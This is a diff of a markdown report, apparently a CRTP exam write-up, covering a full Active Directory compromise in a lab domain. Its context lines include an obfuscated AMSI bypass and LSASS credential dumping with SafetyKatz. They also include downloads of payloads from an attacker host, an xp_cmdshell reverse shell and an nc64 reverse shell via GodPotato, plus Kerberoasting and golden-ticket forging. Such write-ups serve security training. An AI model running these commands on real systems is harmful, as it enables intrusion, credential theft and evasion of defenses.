@@ -226,11 +226,9 @@ MemberObjectClass       : user
 MemberSID               : S-1-5-21-1712611810-3596029332-2671080496-500
 ```
 
-![BloodHound Legacy | Analysis - Find all Domain Admins](crtp_exam_simulation_bloodhound_find_all_domain_admins.png)
+![BloodHound | DCSync Rights](./assets/screenshots/crtp_exam_report_bloodhound_dcsync_rights.png)
 
-![BloodHound Legacy | Analysis - Find Shortest Paths to Domain Admins](crtp_exam_simulation_bloodhound_find_shortest_paths_domain_admins.png)
-
-![BloodHound Legacy | Analysis - Find Principals with DCSync Rights](crtp_exam_simulation_bloodhound_find_principals_with_dcsync_rights.png)
+![BloodHound | SQL Admin](./assets/screenshots/crtp_exam_report_bloodhound_sql_admin.png)
 
 - 1.3) **Identify Domain ACLs, OUs, GPOs**
 
@@ -290,14 +288,6 @@ IdentityReferenceClass  : user
 ```
 ❌
 
-![BloodHound Legacy | Node Info: Applocker - Explicit Object Controllers](crtp_exam_simulation_bloodhound_node_info_explicit_object_controllers_01.png)
-
-![BloodHound Legacy | Node Info: Applocker - Affected OUs](crtp_exam_simulation_bloodhound_node_info_affected_ous_01.png)
-
-![BloodHound Legacy | Node Info: DevOps Policy - Explicit Object Controllers](crtp_exam_simulation_bloodhound_node_info_explicit_object_controllers_02.png)
-
-![BloodHound Legacy | Node Info: DevOps Policy - Affected OUs](crtp_exam_simulation_bloodhound_node_info_affected_ous_02.png)
-
 - 1.4) **Attempt to Discovery Domain Shares**
 
 ![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
@@ -325,8 +315,7 @@ IdentityReferenceClass  : user
 [SNIP]
 ```
 
-[SCREENSHOT]
-❌
+![PowerHuntShares - ShareGraph](./assets/screenshots/crtp_exam_report_powerhuntshares_sharegraph.png)
 
 - 1.5) **Identify Local Admin Access**
 
@@ -431,6 +420,10 @@ BUILTIN\Administrators👥                   Alias            S-1-5-32-544 Manda
 [SNIP]
 ```
 
+![Windows Defender - Turn Off](./assets/screenshots/crtp_exam_report_windows_defender_turnoff.png)
+
+![Windows Firewall - Turn Off](./assets/screenshots/crtp_exam_report_windows_firewall_turnoff.png)
+
 ---
 
 ### Kerberoasting (with PowerView, Rubeus, John)
@@ -520,7 +513,7 @@ $krb5tgs$23$*sqlserversync$tech.finance.corp$MSSQLSvc/dbserver31.tech.finance.co
 [SNIP]
 ```
 
-![kali | attacker $>](https://custom-icon-badges.demolab.com/badge/kali-attacker%20[%24>]-e57373?logo=kali-linux_white_32&logoColor=white)
+![kali | attacker $>](./assets/badges/kali-attacker0.svg)
 
 `john --format=krb5tgs --wordlist=./10k-worst-pass.txt ./krb5tgs_hashes.txt`:
 ```
@@ -551,7 +544,7 @@ Session completed.
 
 Description: Performed Active Directory enumeration to identify users or machines with Constrained Delegation enabled. The attempt to find a user account with delegation rights was unsuccessful. However, enumeration of computer accounts revealed that `tech\STUDVM$` has Constrained Delegation enabled and is allowed to delegate authentication to the CIFS service on `mgmtsrv.tech.finance.corp`. This finding was leveraged to impersonate a privileged user and enabling lateral movement onto `mgmtsrv.tech.finance.corp`.
 
-- **Attempt to Find a Delegator User where Constrained Delegation is Enabled**
+- 4.1) **Attempt to Find a Delegator User where Constrained Delegation is Enabled**
 
 ![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
@@ -567,7 +560,7 @@ Description: Performed Active Directory enumeration to identify users or machine
 ```
 ❌
 
-- **Identify a Delegator Server where Constrained Delegation is Enabled**
+- 4.2) **Identify a Delegator Server where Constrained Delegation is Enabled**
 
 ![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
@@ -621,7 +614,7 @@ dnshostname                   : studvm.tech.finance.corp
 [SNIP]
 ```
 
-- **Extract the Delegator Server AES Kerberos Key**
+- 4.3) **Extract the Delegator Server AES Kerberos Key**
 
 ![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
 
@@ -651,7 +644,7 @@ SID               : S-1-5-18
 [SNIP]
 ```
 
-- **Forge an S4U TGS using the Delegator Server AES Kerberos Key for the CIFS Service Delegation and Leverage it to Request and Obtain a TGS for the HTTP Service**
+- 4.4) **Forge an S4U TGS using the Delegator Server AES Kerberos Key for the CIFS Service Delegation and Leverage it to Request and Obtain a TGS for the HTTP Service**
 
 ![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
 
@@ -710,7 +703,7 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-- **Leverage the Obtained Ticket to Gain Administrator Access and Remote Control on the Delegatee Server**
+- 4.5) **Leverage the Obtained Ticket to Gain Administrator Access and Remote Control on the Delegatee Server**
 
 `winrs -r:mgmtsrv.tech.finance.corp cmd`:
 ```
@@ -721,7 +714,7 @@ C:\Users\Administrator.TECH>
 ```
 🚀
 
-![mgmtsrv | administrator #>](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![mgmtsrv | administrator #>](./assets/badges/mgmtsrv-administrator1.svg)
 
 `set username`:
 ```
@@ -742,9 +735,9 @@ COMPUTERNAME=MGMTSRV🖥️
 
 Description: Executed PowerShell logging and AMSI bypass techniques to evade detection while performing credential extraction. Extracted cleartext credentials and Kerberos keys of `tech\techservice` and `tech\MGMTSRV$` from LSASS memory on `mgmtsrv.tech.finance.corp`. These credentials will be leveraged for lateral movement and further privilege escalation within the domain.
 
-![mgmtsrv | administrator #>](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![mgmtsrv | administrator #>](./assets/badges/mgmtsrv-administrator1.svg)
 
-- **Bypassing PowerShell Logging and AMSI for Evasion**
+- 5.1) **Bypassing PowerShell Logging and AMSI for Evasion**
 
 `powershell`
 
@@ -761,11 +754,9 @@ FullLanguage
 S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
 
-- **Extract Credentials of `tech\techservice` and `tech\MGMTSRV$` from LSASS Memory on `mgmtsrv.tech.finance.corp`**
+- 5.2) **Extract Credentials of `tech\techservice` and `tech\MGMTSRV$` from LSASS Memory on `mgmtsrv.tech.finance.corp`**
 
-![HFS - Loader.exe, SafetyKatz.exe](learning_objective_07_hfs_loader_safetykatz.png)
-
-![mgmtsrv | administrator #>](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![mgmtsrv | administrator #>](./assets/badges/mgmtsrv-administrator1.svg)
 
 `iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`
 
@@ -969,7 +960,9 @@ Description: Used the AES-256 Kerberos Key of `tech\techservice`, extracted in a
   ASREP (key)              :  7F6825F607E9474BCD6B9C684DC70F7C1CA977ADE7BFD2AD152FD54968349DEB
 ```
 
-![New spawned terminal process 1](learning_objective_07_new_spawned_terminal_process_1.png)
+![Spawned `cmd` process](./assets/screenshots/spawned_cmd.svg)
+
+![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
 
 `klist`:
 ```
@@ -998,7 +991,7 @@ C:\Users\techservice>
 ```
 🚀
 
-![techsrv30 | techservice #>](https://custom-icon-badges.demolab.com/badge/techsrv30-techservice%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![techsrv30 | techservice #>](./assets/badges/techsrv30-techservice1.svg)
 
 `set username`:
 ```
@@ -1019,9 +1012,9 @@ COMPUTERNAME=TECHSRV30🖥️
 
 Description: Executed PowerShell logging and AMSI bypass techniques to evade detection while performing credential extraction. Extracted cleartext credentials of `tech\databaseagent` from the Windows Credential Vault and Kerberos keys of `tech\TECHSRV30$` from LSASS memory on `techsrv30.tech.finance.corp`. These credentials will be leveraged for lateral movement and further privilege escalation within the domain.
 
-- **Bypassing PowerShell Logging and AMSI for Evasion**
+- 8.1) **Bypassing PowerShell Logging and AMSI for Evasion**
 
-![techsrv30 | techservice #>](https://custom-icon-badges.demolab.com/badge/techsrv30-techservice%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![techsrv30 | techservice #>](./assets/badges/techsrv30-techservice1.svg)
 
 `powershell`
 
@@ -1038,11 +1031,9 @@ FullLanguage
 S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
 
-- **Extract Credentials of `tech\databaseagent` and `tech\TECHSRV30$` from LSASS Memory on `techsrv30.tech.finance.corp`**
+- 8.2) **Extract Credentials of `tech\databaseagent` and `tech\TECHSRV30$` from LSASS Memory on `techsrv30.tech.finance.corp`**
 
-![HFS - Loader.exe, SafetyKatz.exe](learning_objective_07_hfs_loader_safetykatz.png)
-
-![techsrv30 | techservice #>](https://custom-icon-badges.demolab.com/badge/techsrv30-techservice%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![techsrv30 | techservice #>](./assets/badges/techsrv30-techservice1.svg)
 
 `iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`
 
@@ -1121,7 +1112,7 @@ Enter the password for tech\databaseagent:📌
 Attempting to start powershell -Command "Start-Process cmd -Verb RunAs" as user "tech\databaseagent" ...
 ```
 
-![New spawned terminal process 2](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_2.png)
+![Spawned `cmd` process](./assets/badges/spawned_cmd.svg)
 
 ![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
@@ -1171,7 +1162,7 @@ SeCreateGlobalPrivilege                   Create global objects                 
 
 Description: Exploited a `sysadmin`-level SQL Server instance on `dbserver31.tech.finance.corp` via `xp_cmdshell` to achieve lateral movement in the domain. Using the `tech\databaseagent` account, which held `sysadmin` privileges, we confirmed command execution capabilities and ultimately launched a PowerShell reverse shell, gaining a foothold on `dbserver31.tech.finance.corp` as `tech\sqlserversync`. This new session enables further escalation and post-exploitation actions within the environment.
 
-- **Identify a Target SQL Server where we have Authentication Rights**
+- 10.1) **Identify a Target SQL Server where we have Authentication Rights**
 
 ![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
@@ -1235,7 +1226,7 @@ Cached Tickets: (2)
         Kdc Called: tech-dc.tech.finance.corp
 ```
 
-- **Enumerate Linked Servers on the Target SQL Server**
+- 10.2) **Enumerate Linked Servers on the Target SQL Server**
 
 `Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Verbose`:
 ```
@@ -1261,7 +1252,7 @@ Links       :
 ```
 ❌
 
-- **Validate Command Execution on the Target SQL Server**
+- 10.3) **Validate Command Execution on the Target SQL Server**
 
 `Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query "exec master..xp_cmdshell 'set username'"`:
 ```
@@ -1274,7 +1265,7 @@ User        : TECH\databaseagent
 Links       :
 ```
 
-- **Obtain a Reverse Shell Executing a PowerShell Script on the Target SQL Server**
+- 10.4) **Obtain a Reverse Shell Executing a PowerShell Script on the Target SQL Server**
 
 ![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
@@ -1285,7 +1276,7 @@ listening on [any] 443 ...
 [...]
 ```
 
-![Invoke-PowerShellTcpEx.ps1](./assets/screenshots/learning_objective_22_invokepowershelltcpex.png)
+![Invoke-PowerShellTcpEx.ps1](./assets/screenshots/crtp_exam_report_invokepowershelltcpex.png)
 
 `Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget 'dbserver31'`
 
@@ -1303,7 +1294,7 @@ PS C:\Windows\system32>
 ```
 🚀
 
-![dbserver31 | sqlserversync $>](https://custom-icon-badges.demolab.com/badge/dbserver31-sqlserversync%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![dbserver31 | system #>](./assets/badges/dbserver31-system1.svg)
 
 `$env:username`:
 ```
@@ -1339,9 +1330,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 Description: Attempted to extract credentials from `dbserver31.tech.finance.corp` using `SafetyKatz`, but the operation failed due to insufficient privileges. Since the session was not running in high integrity, access to the LSASS process was restricted. This failure highlights the necessity of obtaining elevated privileges before attempting credential extraction.
 
-![dbserver31 | sqlserversync $>](https://custom-icon-badges.demolab.com/badge/dbserver31-sqlserversync%20[%24>]-64b5f6?logo=windows11&logoColor=white)
-
-![HFS - Loader.exe, SafetyKatz.exe](learning_objective_07_hfs_loader_safetykatz.png)
+![dbserver31 | system #>](./assets/badges/dbserver31-system1.svg)
 
 `iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt)`
 
@@ -1372,7 +1361,7 @@ Description: Attempted to extract credentials from `dbserver31.tech.finance.corp
 
 Description: Used `GodPotato`, an exploit leveraging Named Pipe token impersonation, to escalate privileges to `SYSTEM` on `dbserver31.tech.finance.corp`. A reverse shell was established to maintain access and facilitate further post-exploitation activities.
 
-![dbserver31 | sqlserversync $>](https://custom-icon-badges.demolab.com/badge/dbserver31-sqlserversync%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![dbserver31 | sqlserversync $>](./assets/badges/dbserver31-sqlserversync0.svg)
 
 `Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\' | Get-ItemPropertyValue -Name Version`:
 ```
@@ -1392,7 +1381,7 @@ listening on [any] 1337 ...
 [...]
 ```
 
-![dbserver31 | sqlserversync $>](https://custom-icon-badges.demolab.com/badge/dbserver31-sqlserversync%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![dbserver31 | sqlserversync $>](./assets/badges/dbserver31-sqlserversync0.svg)
 
 `C:\Users\Public\GodPotato-NET4.exe -cmd "C:\Users\Public\nc64.exe -e C:\Windows\System32\cmd.exe 172.16.100.1 1337"`
 
@@ -1410,7 +1399,7 @@ C:\Windows\system32>
 ```
 🚀
 
-![dbserver31 | system $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-system%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![dbserver31 | system #>](./assets/badges/dbserver31-system1.svg)
 
 `$env:username`:
 ```
@@ -1430,9 +1419,9 @@ DBSERVER31🖥️
 
 Description: Executed PowerShell logging and AMSI bypass techniques to evade detection while performing credential extraction. Extracted Kerberos keys of `tech\sqlserversync` and `tech\DBSERVER31$` from LSASS memory on `dbserver31.tech.finance.corp`. These credentials will be leveraged for lateral movement and further privilege escalation within the domain.
 
-- **Bypassing PowerShell Logging and AMSI for Evasion**
+- 13.1) **Bypassing PowerShell Logging and AMSI for Evasion**
 
-![dbserver31 | system $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-system%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![dbserver31 | system #>](./assets/badges/dbserver31-system1.svg)
 
 `powershell`
 
@@ -1449,9 +1438,9 @@ FullLanguage
 S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
 
-- **Extract Credentials of `tech\sqlserversync` and `tech\DBSERVER31$` from LSASS Memory on `dbserver31.tech.finance.corp`**
+- 13.2) **Extract Credentials of `tech\sqlserversync` and `tech\DBSERVER31$` from LSASS Memory on `dbserver31.tech.finance.corp`**
 
-![dbserver31 | system $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-system%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![dbserver31 | system #>](./assets/badges/dbserver31-system1.svg)
 
 `C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
 ```
@@ -1555,7 +1544,9 @@ Description: An OverPass-The-Hash approach was used to impersonate `tech\sqlserv
   ASREP (key)              :  9AD6E6B51E9E3C9512B3A924360F779886D7B08E6DA23D01AA4F664270B7EE65
 ```
 
-![New spawned terminal process](learning_objective_12_new_spawned_terminal_process.png)
+![Spawned `cmd` process](./assets/badges/spawned_cmd.svg)
+
+![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
 
 `klist`:
 ```
@@ -1755,7 +1746,7 @@ Description: Leveraged the AES-256 Kerberos key extracted for `tech\administrato
   ASREP (key)              :  D9410BD213225049D5BEB8CD5FA2EEEFC856FFBAA6F35541AC91D6BA2C5ED165
 ```
 
-![New spawned terminal process](./assets/screenshots/learning_objective_08_new_spawned_terminal_process.png)
+![Spawned `cmd` process](./assets/badges/spawned_cmd.svg)
 
 ![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
 
@@ -1801,7 +1792,7 @@ C:\Users\Administrator>
 ```
 🚀
 
-![tech-dc | administrator #>](https://custom-icon-badges.demolab.com/badge/tech--dc-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![tech-dc | administrator #>](./assets/badges/techdc-administrator1.svg)
 
 `whoami`:
 ```
@@ -1843,9 +1834,7 @@ Mandatory Label\High Mandatory Level        Label            S-1-16-12288
 
 Description: Extracted credentials include the NTLM hashes of high-privileged accounts such as `tech\administrator` and `tech\krbtgt` from LSASS memory on `tech-dc.tech.finance.corp`. These credentials can be used for domain lateral movement, escalating privileges, and maintaining domain persistence.
 
-![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_08_hfs_safetykatz.png)
-
-![tech-dc | administrator #>](https://custom-icon-badges.demolab.com/badge/tech--dc-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![tech-dc | administrator #>](./assets/badges/techdc-administrator1.svg)
 
 `netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
 
@@ -1930,7 +1919,7 @@ NTLM : 862f4b5c687b92f464576a572b5214e6
 
 Description: Abused the child domain `krbtgt` TGT encryption key from `tech.finance.corp` to forge a Golden Ticket that includes the Enterprise Admin SID in its SID History. Leveraging this forged ticket enabled cross-domain privilege escalation and domain lateral movement, ultimately granting administrative access on `finance-dc.finance.corp` and facilitating further exploitation within the root domain `finance.corp`.
 
-- **Forge a Golden Ticket (with EA SID History) using the Child DC's `krbtgt` TGT Encryption Key**
+- 17.1) **Forge a Golden Ticket (with EA SID History) using the Child DC's `krbtgt` TGT Encryption Key**
 
 ![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
 
@@ -1985,7 +1974,7 @@ S-1-5-21-1712611810-3596029332-2671080496-519📌
 [+] Ticket successfully imported!🎟️
 ```
 
-- **Leverage the Forged Ticket to Gain Enterprise Administrator Access and Remote Control to the Parent DC**
+- 17.2) **Leverage the Forged Ticket to Gain Enterprise Administrator Access and Remote Control to the Parent DC**
 
 `klist`:
 ```
@@ -2034,7 +2023,7 @@ C:\Users\Administrator.TECH>
 ```
 🚀
 
-![finance-dc | administrator #>](https://custom-icon-badges.demolab.com/badge/finance--dc-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![finance-dc | administrator #>](./assets/badges/financedc-administrator1.svg)
 
 `set username`:
 ```
@@ -2055,9 +2044,7 @@ COMPUTERNAME=FINANCE-DC🖥️
 
 Description: Extracted the NTLM hashes of all the domain accounts from LSASS memory on `finance-dc.finance.corp`. These credentials can be leveraged for lateral movement and further privilege escalation within the root domain `finance.corp`.
 
-![finance-dc | administrator #>](https://custom-icon-badges.demolab.com/badge/finance--dc-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
-
-![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_08_hfs_safetykatz.png)
+![finance-dc | administrator #>](./assets/badges/financedc-administrator1.svg)
 
 `netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
 
@@ -2096,3 +2083,5 @@ NTLM : 862f4b5c687b92f464576a572b5214e6
 
 ---
 ---
+
+
